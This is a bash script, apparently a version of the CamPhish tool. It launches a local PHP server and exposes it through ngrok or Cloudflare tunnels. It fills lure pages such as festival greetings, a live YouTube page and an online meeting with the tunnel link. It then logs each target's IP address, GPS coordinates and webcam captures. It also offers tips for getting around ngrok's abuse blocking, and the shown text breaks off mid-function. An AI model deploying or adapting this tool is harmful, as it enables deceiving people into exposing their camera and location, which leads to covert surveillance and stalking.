#!/usr/bin/env bash
# CamPhish v3.0
# Updated by Tahir Siddique | Original by TechChip

if [[ -z "${BASH_VERSION:-}" ]]; then
exec bash "$0" "$@"
fi

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

CAMPHISH_PORT=3333
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR" || exit 1

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 3.0 \e[0m \n"
printf " \e[1;96m Updated by Tahir Siddique \e[0m \n"

printf "\n"


}

dependencies() {
local missing=""
for cmd in php curl wget sed grep; do
command -v "$cmd" > /dev/null 2>&1 || missing="$missing $cmd"
done
if [[ -n "$missing" ]]; then
printf "\e[1;31m[!] Missing required tools:%s\e[0m\n" "$missing"
if [[ "$windows_mode" == false ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] On Kali/Debian/Ubuntu run:\e[0m\n"
printf "    sudo apt-get update && sudo apt-get install -y php curl wget sed grep procps\n"
fi
exit 1
fi
}

read_pid_file() {
local pidfile="$1"
local pid=""
[[ -f "$pidfile" ]] || return 1
pid=$(tr -d '\r\n ' < "$pidfile")
[[ "$pid" =~ ^[0-9]+$ ]] || return 1
printf '%s' "$pid"
}

kill_by_name() {
local signal="$1"
local name="$2"
if command -v pkill > /dev/null 2>&1; then
pkill "-${signal}" -f "$name" > /dev/null 2>&1
fi
if command -v killall > /dev/null 2>&1; then
killall "-${signal}" "$name" > /dev/null 2>&1
fi
}

LOADER_PID=""
LOADER_MSG=""

start_loader() {
local msg="${1:-Loading...}"
LOADER_MSG="$msg"
if [[ -n "$LOADER_PID" ]] && kill -0 "$LOADER_PID" 2>/dev/null; then
kill "$LOADER_PID" 2>/dev/null
wait "$LOADER_PID" 2>/dev/null
fi
(
local spin='|/-\'
local i=0
while true; do
printf "\r\e[1;93m[\e[0m%s\e[1;93m]\e[0m %s" "${spin:i++%4:1}" "$msg"
sleep 0.12
done
) &
LOADER_PID=$!
}

stop_loader() {
if [[ -n "$LOADER_PID" ]] && kill -0 "$LOADER_PID" 2>/dev/null; then
kill "$LOADER_PID" 2>/dev/null
wait "$LOADER_PID" 2>/dev/null
fi
LOADER_PID=""
printf "\r\033[K"
}

run_with_loader() {
local msg="$1"
shift
start_loader "$msg"
"$@"
local rc=$?
stop_loader
return $rc
}

download_with_loader() {
local msg="$1"
shift
start_loader "$msg"
"$@" > /dev/null 2>&1 &
local pid=$!
wait "$pid"
local rc=$?
stop_loader
return $rc
}

NGROK_LOG_TAIL_POS=0

print_new_ngrok_lines() {
local logfile=".ngrok.log"
local total new_content
[[ -f "$logfile" ]] || return 0
total=$(wc -c < "$logfile" 2>/dev/null | tr -d ' \n')
total=${total:-0}
if [[ $total -gt $NGROK_LOG_TAIL_POS ]]; then
new_content=$(tail -c +$((NGROK_LOG_TAIL_POS + 1)) "$logfile" 2>/dev/null)
if [[ -n "$new_content" ]]; then
stop_loader
printf "%s" "$new_content"
[[ -n "$LOADER_MSG" ]] && start_loader "$LOADER_MSG"
fi
NGROK_LOG_TAIL_POS=$total
fi
}

get_ngrok_link_from_api() {
local link=""
link=$(php -r '
$ctx = stream_context_create(["http" => ["timeout" => 3]]);
$json = @file_get_contents("http://127.0.0.1:4040/api/tunnels", false, $ctx);
if ($json === false) exit(1);
$data = json_decode($json, true);
if (!is_array($data) || empty($data["tunnels"])) exit(1);
foreach ($data["tunnels"] as $tunnel) {
  if (!empty($tunnel["public_url"]) && strpos($tunnel["public_url"], "http") === 0) {
    echo $tunnel["public_url"];
    exit(0);
  }
}
exit(1);
' 2>/dev/null)
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
local api_response
api_response=$(curl -s --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null)
if [[ -z "$api_response" ]]; then
return 1
fi
link=$(echo "$api_response" | grep -oE '"public_url"\s*:\s*"https?://[^"]+"' | head -n1 | grep -oE 'https?://[^"]+')
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(echo "$api_response" | grep -oE 'https://[a-zA-Z0-9._-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io|ngrok\.dev)[^"[:space:]]*' | head -n1)
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
return 1
}

get_ngrok_link_from_log() {
local logfile="${1:-.ngrok.log}"
local link=""
[[ -f "$logfile" ]] || return 1
link=$(grep -E 'Forwarding|forwarding' "$logfile" | grep -oE 'https://[a-zA-Z0-9._-]+[^[:space:]]*' | head -n1)
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(grep -oE 'url=https://[a-zA-Z0-9._-]+[^[:space:]]+' "$logfile" | head -n1 | sed 's/^url=//')
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(grep -oE '"public_url"\s*:\s*"https?://[^"]+"' "$logfile" | head -n1 | grep -oE 'https?://[^"]+')
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(grep -oE 'https://[a-zA-Z0-9._-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io|ngrok\.dev)(/[[:alnum:]/?=&._%-]*)?' "$logfile" | head -n1)
[[ -n "$link" ]] && printf '%s' "$link"
}

show_ngrok_log_summary() {
if [[ ! -f ".ngrok.log" ]]; then
return 1
fi
printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok output:\e[0m\n"
if grep -qE 'Forwarding|forwarding|Session Status|ERR_|error|started tunnel|url=' .ngrok.log; then
grep -E 'Forwarding|forwarding|Session Status|ERR_|error|started tunnel|url=|https://.*ngrok' .ngrok.log | tail -n 25
else
tail -n 25 .ngrok.log
fi
}

get_cloudflare_link() {
local logfile="$1"
local link=""
if [[ ! -f "$logfile" ]]; then
return 1
fi
# Quick tunnel hostnames are random multi-part names, e.g. words-words-words.trycloudflare.com
link=$(grep -oE 'https://[a-z0-9]+(-[a-z0-9]+)+\.trycloudflare\.com' "$logfile" | head -n1)
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(grep -oE '[a-z0-9]+(-[a-z0-9]+)+\.trycloudflare\.com' "$logfile" | head -n1)
if [[ -n "$link" ]]; then
printf 'https://%s' "$link"
return 0
fi
return 1
}

cleanup_stale_servers() {
if [[ "$windows_mode" == true ]]; then
taskkill /F /IM "php.exe" 2>/dev/null
taskkill /F /IM "cloudflared.exe" 2>/dev/null
taskkill /F /IM "ngrok.exe" 2>/dev/null
else
if [[ -f ".php-server.pid" ]]; then
pid=$(read_pid_file ".php-server.pid")
[[ -n "$pid" ]] && kill "$pid" 2>/dev/null
rm -f .php-server.pid
fi
pkill -f "php -S .*:${CAMPHISH_PORT}" > /dev/null 2>&1
kill_by_name 2 cloudflared
kill_by_name 2 ngrok
fi
rm -f .php-server.log
sleep 1
}

ngrok_config_path() {
if [[ "$windows_mode" == true ]]; then
printf "%s\\ngrok.yml" "$(pwd)"
else
printf "%s/ngrok.yml" "$(pwd)"
fi
}

ngrok_has_authtoken() {
local config_file="$1"
[[ -f "$config_file" ]] && grep -qE 'authtoken:[[:space:]]*[A-Za-z0-9_/-]+' "$config_file"
}

setup_ngrok_auth() {
local ngrok_bin="$1"
local config_file legacy_config
config_file=$(ngrok_config_path)

if ! ngrok_has_authtoken "$config_file"; then
for legacy_config in "$HOME/.config/ngrok/ngrok.yml" "$HOME/.ngrok2/ngrok.yml"; do
if ngrok_has_authtoken "$legacy_config"; then
cp "$legacy_config" "$config_file"
printf "\e[1;92m[\e[0m*\e[1;92m] Imported existing ngrok authtoken from %s\e[0m\n" "$legacy_config"
break
fi
done
fi

if ngrok_has_authtoken "$config_file"; then
printf "\e[1;93m[\e[0m*\e[1;93m] Using saved ngrok authtoken from %s\e[0m\n" "$config_file"
read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Change ngrok authtoken? [y/N]:\e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
"$ngrok_bin" config add-authtoken "$ngrok_auth" --config="$config_file"
fi
return 0
fi

printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok v3 requires a free account authtoken (this is mandatory).\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Sign up free and copy your token from:\e[0m\n"
printf "\e[1;77m    https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n\n"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Paste your ngrok authtoken: \e[0m' ngrok_auth

if [[ -z "$ngrok_auth" ]]; then
printf "\e[1;31m[!] No authtoken provided. Ngrok cannot start without one.\e[0m\n"
return 1
fi

if ! "$ngrok_bin" config add-authtoken "$ngrok_auth" --config="$config_file"; then
printf "\e[1;31m[!] Failed to save ngrok authtoken. Check the token and try again.\e[0m\n"
return 1
fi

if ! ngrok_has_authtoken "$config_file"; then
printf "\e[1;31m[!] Authtoken was not saved correctly in %s\e[0m\n" "$config_file"
return 1
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok authtoken saved successfully\e[0m\n"
return 0
}

get_ngrok_link() {
local link=""
link=$(get_ngrok_link_from_api)
if [[ -n "$link" ]]; then
printf '%s' "$link"
return 0
fi
link=$(get_ngrok_link_from_log ".ngrok.log")
[[ -n "$link" ]] && printf '%s' "$link"
}

wait_for_ngrok_link() {
local attempt=0
local link=""
NGROK_LOG_TAIL_POS=0
LOADER_MSG="Waiting for ngrok public URL..."
start_loader "$LOADER_MSG"
while [[ $attempt -lt 45 ]]; do
print_new_ngrok_lines
link=$(get_ngrok_link)
if [[ -n "$link" ]]; then
stop_loader
print_new_ngrok_lines
printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok tunnel established\e[0m\n"
show_ngrok_log_summary
printf '%s' "$link"
return 0
fi
if [[ -f ".ngrok.log" ]] && grep -qE "ERR_NGROK_8014|Acceptable Use policy|authentication failed|failed to authenticate|invalid authtoken" ".ngrok.log"; then
stop_loader
print_new_ngrok_lines
return 1
fi
sleep 2
attempt=$((attempt + 1))
LOADER_MSG="Waiting for ngrok public URL... (${attempt}/45)"
start_loader "$LOADER_MSG"
done
stop_loader
print_new_ngrok_lines
return 1
}

show_ngrok_failure() {
if [[ -f ".ngrok.log" ]] && grep -q "ERR_NGROK_8014" ".ngrok.log"; then
printf "\e[1;31m[!] Ngrok blocked this account (ERR_NGROK_8014 — Acceptable Use Policy).\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] This is NOT a university WiFi issue. Ngrok rejected the connection on their servers.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Phishing/security lab tools often trigger ngrok abuse detection.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] For your lab demo use option 03 (Local Network) instead.\e[0m\n"
printf "\e[1;77m    https://ngrok.com/docs/errors/err_ngrok_8014\e[0m\n"
return 0
fi
if [[ -f ".ngrok.log" ]] && grep -q "authentication failed" ".ngrok.log"; then
printf "\e[1;31m[!] Ngrok authentication failed — check your authtoken.\e[0m\n"
return 0
fi
return 1
}

get_local_ip() {
local ip=""
ip=$(hostname -I 2>/dev/null | awk '{print $1}')
if [[ -z "$ip" ]]; then
ip=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1); exit}')
fi
printf "%s" "$ip"
}

payload_site() {
link="$1"
if [[ -z "$link" || "$link" != http* ]]; then
printf "\e[1;31m[!] Invalid tunnel link — cannot generate pages.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Got: %s\e[0m\n" "$link"
exit 1
fi
sed "s+forwarding_link+${link}+g" template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html
sed "s+fes_name+${fest_name}+g" index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed "s+forwarding_link+${link}+g" LiveYTTV.html > index3.html
sed "s+live_yt_tv+${yt_video_ID}+g" index3.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
sed "s+forwarding_link+${link}+g" OnlineMeeting.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
sed "s+forwarding_link+${link}+g" UWS.html > index2.html
else
printf "\e[1;93m [!] Invalid template option!\e[0m\n"
exit 1
fi
rm -rf index3.html
}

check_cloudflared_config_conflict() {
local config_file=""
if [[ -f "$HOME/.cloudflared/config.yaml" ]]; then
config_file="$HOME/.cloudflared/config.yaml"
elif [[ -f "$HOME/.cloudflared/config.yml" ]]; then
config_file="$HOME/.cloudflared/config.yml"
fi
if [[ -n "$config_file" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] Found %s — this can block TryCloudflare quick tunnels.\e[0m\n" "$config_file"
printf "\e[1;93m[\e[0m!\e[1;93m] Temporarily renaming it for this session...\e[0m\n"
mv "$config_file" "${config_file}.camphish.bak"
cloudflared_config_backup="${config_file}.camphish.bak"
fi
}

restore_cloudflared_config() {
if [[ -n "$cloudflared_config_backup" && -f "$cloudflared_config_backup" ]]; then
mv "$cloudflared_config_backup" "${cloudflared_config_backup%.camphish.bak}"
cloudflared_config_backup=""
fi
}

cloudflared_bin() {
if [[ "$windows_mode" == true ]]; then
printf "./cloudflared.exe"
else
printf "./cloudflared"
fi
}

cloudflared_is_running() {
local pid=""
if [[ -f ".cloudflared.pid" ]]; then
pid=$(read_pid_file ".cloudflared.pid")
if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
return 0
fi
fi
if command -v pgrep > /dev/null 2>&1; then
pgrep -f "cloudflared tunnel.*127.0.0.1:${CAMPHISH_PORT}" > /dev/null 2>&1 && return 0
fi
ps aux 2>/dev/null | grep -v grep | grep -q "cloudflared tunnel" && return 0
return 1
}

stop_cloudflared_only() {
local pid=""
if [[ -f ".cloudflared.pid" ]]; then
pid=$(read_pid_file ".cloudflared.pid")
[[ -n "$pid" ]] && kill "$pid" 2>/dev/null
rm -f .cloudflared.pid
fi
pkill -f "cloudflared tunnel.*127.0.0.1:${CAMPHISH_PORT}" > /dev/null 2>&1
kill_by_name 2 cloudflared
sleep 1
}

verify_php_server() {
if command -v curl > /dev/null 2>&1; then
curl -s -o /dev/null -m 3 "http://127.0.0.1:${CAMPHISH_PORT}/" 2>/dev/null
return $?
fi
if command -v nc > /dev/null 2>&1; then
nc -z 127.0.0.1 "$CAMPHISH_PORT" > /dev/null 2>&1
return $?
fi
sleep 1
return 0
}

start_php_server() {
local bind_address="${1:-127.0.0.1}"
cleanup_stale_servers
printf "\e[1;92m[\e[0m+\e[1;92m] Step 1: Starting local PHP server on %s:%s...\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
printf "\e[1;77m    (Same as: php -S %s:%s -t .)\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
php -S "${bind_address}:${CAMPHISH_PORT}" -t . > .php-server.log 2>&1 &
echo $! > .php-server.pid
start_loader "Starting PHP server..."
sleep 2
if ! verify_php_server; then
stop_loader
printf "\e[1;31m[!] Local PHP server failed to start.\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Try manually in this folder: php -S %s:%s -t .\e[0m\n" "$bind_address" "$CAMPHISH_PORT"
return 1
fi
stop_loader
printf "\e[1;92m[\e[0m*\e[1;92m] Local server running at http://127.0.0.1:%s\e[0m\n" "$CAMPHISH_PORT"
return 0
}

start_ngrok_tunnel() {
local ngrok_bin="$1"
local ngrok_config="$2"
printf "\e[1;92m[\e[0m+\e[1;92m] Step 2: Starting ngrok tunnel to local port %s...\e[0m\n" "$CAMPHISH_PORT"
printf "\e[1;77m    (Same as: %s http %s --config=%s)\e[0m\n" "$ngrok_bin" "$CAMPHISH_PORT" "$ngrok_config"
rm -f .ngrok.log .ngrok.pid
NGROK_LOG_TAIL_POS=0
nohup "$ngrok_bin" http "$CAMPHISH_PORT" --config="$ngrok_config" > .ngrok.log 2>&1 &
echo $! > .ngrok.pid
printf "\e[1;77m    Ngrok output will appear below while the tunnel connects...\e[0m\n"
sleep 2
}

start_cloudflared_tunnel() {
local cf_bin="$1"
local proto="${2:-auto}"
mkdir -p .camphish-cloudflared
rm -f .cloudflared.out .cloudflared.pid

if [[ "$proto" == "auto" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Step 2: Starting cloudflared tunnel to local port %s...\e[0m\n" "$CAMPHISH_PORT"
printf "\e[1;77m    (Same as: %s tunnel --url http://127.0.0.1:%s)\e[0m\n" "$cf_bin" "$CAMPHISH_PORT"
nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url "http://127.0.0.1:${CAMPHISH_PORT}" --loglevel info > .cloudflared.out 2>&1 &
else
printf "\e[1;92m[\e[0m+\e[1;92m] Retrying cloudflared with --protocol %s...\e[0m\n" "$proto"
printf "\e[1;77m    (Same as: %s tunnel --url http://127.0.0.1:%s --protocol %s)\e[0m\n" "$cf_bin" "$CAMPHISH_PORT" "$proto"
nohup env HOME="$(pwd)/.camphish-cloudflared" "$cf_bin" tunnel --no-autoupdate --url "http://127.0.0.1:${CAMPHISH_PORT}" --protocol "$proto" --loglevel info > .cloudflared.out 2>&1 &
fi

echo $! > .cloudflared.pid
sleep 3
}

wait_for_cloudflare_tunnel() {
local attempt=0
local link=""
LOADER_MSG="Waiting for Cloudflare tunnel URL..."
start_loader "$LOADER_MSG"
while [[ $attempt -lt 30 ]]; do
if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
stop_loader
return 1
fi
link=$(get_cloudflare_link ".cloudflared.out")
if [[ -n "$link" ]] && cloudflared_is_running; then
stop_loader
printf '%s' "$link"
return 0
fi
sleep 2
attempt=$((attempt + 1))
LOADER_MSG="Waiting for Cloudflare tunnel URL... (${attempt}/30)"
start_loader "$LOADER_MSG"
done
stop_loader
return 1
}

launch_cloudflared_with_retry() {
local cf_bin link proto
cf_bin=$(cloudflared_bin)
rm -f .cloudflared.log .tunnel.link

for proto in auto http2 quic; do
if [[ "$proto" != "auto" ]]; then
stop_cloudflared_only
fi
start_cloudflared_tunnel "$cf_bin" "$proto"
link=$(wait_for_cloudflare_tunnel)
if [[ -n "$link" ]]; then
printf '%s' "$link" > .tunnel.link
return 0
fi
stop_cloudflared_only
done

return 1
}

stop() {
if [[ "$windows_mode" == true ]]; then
taskkill /F /IM "ngrok.exe" 2>/dev/null
taskkill /F /IM "php.exe" 2>/dev/null
taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
cleanup_stale_servers
fi
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt
}

catch_location() {
  # First check for the current_location.txt file which is always created
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
    # Filter out unwanted messages before displaying
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    
    # Move it to a backup to avoid duplicate display
    mv current_location.txt current_location.bak
  fi

  # Then check for any location_* files
  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    # Only display essential location data
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
    
    # Create directory for saved locations if it doesn't exist
    if [[ ! -d "saved_locations" ]]; then
      mkdir -p saved_locations
    fi
    
    mv "$location_file" saved_locations/
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
    
    # Don't display any debug logs to avoid showing unwanted messages
  fi
}

checkfound() {
# Create directory for saved locations if it doesn't exist
if [[ ! -d "saved_locations" ]]; then
  mkdir -p saved_locations
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
if [[ -f ".cloudflared.pid" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] Keep this terminal open or the Cloudflare tunnel will stop (Error 1033).\e[0m\n"
fi
while true; do

if [[ -f ".cloudflared.pid" ]] && ! cloudflared_is_running; then
printf "\n\e[1;31m[!] cloudflared stopped running! Tunnel is down (Error 1033).\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Restart with: bash camphish.sh\e[0m\n"
rm -f .cloudflared.pid
fi

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

# Check for current_location.txt first (our new immediate indicator)
if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
catch_location
fi

# Also check for LocationLog.log (the original indicator)
if [[ -e "LocationLog.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
# Don't display the raw log content, just process it
catch_location
rm -rf LocationLog.log
fi

# Don't display error logs to avoid showing unwanted messages
if [[ -e "LocationError.log" ]]; then
# Just remove the file without displaying its contents
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] && ! ./cloudflared --version > /dev/null 2>&1; then
rm -f cloudflared cloudflared.exe
fi
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
start_loader "Downloading Cloudflared..."

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            stop_loader
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
stop_loader
fi

check_cloudflared_config_conflict

if ! start_php_server "127.0.0.1"; then
restore_cloudflared_config
exit 1
fi

if launch_cloudflared_with_retry; then
link=$(tr -d '\r\n ' < .tunnel.link)
else
link=""
fi
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m cloudflared process crashed after starting\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m University/lab firewall may block port 7844 (TCP+UDP)\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try Ngrok instead (option 1) — often works better on campus networks\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Manual test:\e[0m\n"
printf "\e[1;77m    php -S 127.0.0.1:%s -t .\e[0m\n" "$CAMPHISH_PORT"
printf "\e[1;77m    ./cloudflared tunnel --url http://127.0.0.1:%s\e[0m\n" "$CAMPHISH_PORT"
if [[ -f ".cloudflared.out" ]]; then
printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared output (last 15 lines):\e[0m\n"
tail -n 15 .cloudflared.out
fi
restore_cloudflared_config
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
printf "\e[1;77m    (Random *.trycloudflare.com URL — NOT api.trycloudflare.com)\e[0m\n"
